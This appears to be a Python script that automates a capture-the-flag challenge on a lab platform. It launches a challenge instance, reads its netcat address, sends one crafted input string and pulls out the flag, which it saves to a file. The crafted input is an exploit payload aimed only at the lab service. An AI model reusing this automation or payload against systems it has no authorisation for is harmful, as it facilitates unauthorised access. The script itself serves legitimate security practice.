import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

CID = 346
cy = CyLab(delay=1.5)
cy.login()
cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
host = None
for _ in range(15):
    time.sleep(3)
    st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
    d = json.loads(b)
    txt = re.sub(r"<[^>]+>", "", d.get("description") or "")
    m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d{2,5})", txt)
    print(d.get("status"), m.group(0) if m else None, flush=True)
    if m and d.get("status") == "RUNNING":
        host = (m.group(1), int(m.group(2)))
        break
if not host:
    raise SystemExit("no instance")

line = (b"l]" + b"w" * 4 + b"d" * 47 + b"w") + b"\n"
s = socket.create_connection(host, timeout=20)
s.settimeout(3)
time.sleep(1.5)
buf = b""
t0 = time.time()
while time.time() - t0 < 3:
    try:
        dd = s.recv(65536)
    except socket.timeout:
        break
    if not dd:
        break
    buf += dd
print("banner", len(buf))
s.sendall(line)
out = b""
t0 = time.time()
while time.time() - t0 < 12:
    try:
        dd = s.recv(65536)
    except socket.timeout:
        continue
    if not dd:
        break
    out += dd
print("out", len(out))
print("tail:", out[-600:])
m = re.search(rb"(academy|picoCTF)\{[^}]{1,120}\}", buf + out)
print("FLAG:", m.group(0).decode() if m else None)
if m:
    open(r"./_z_bg2_flag.txt", "w").write(m.group(0).decode())
s.close()
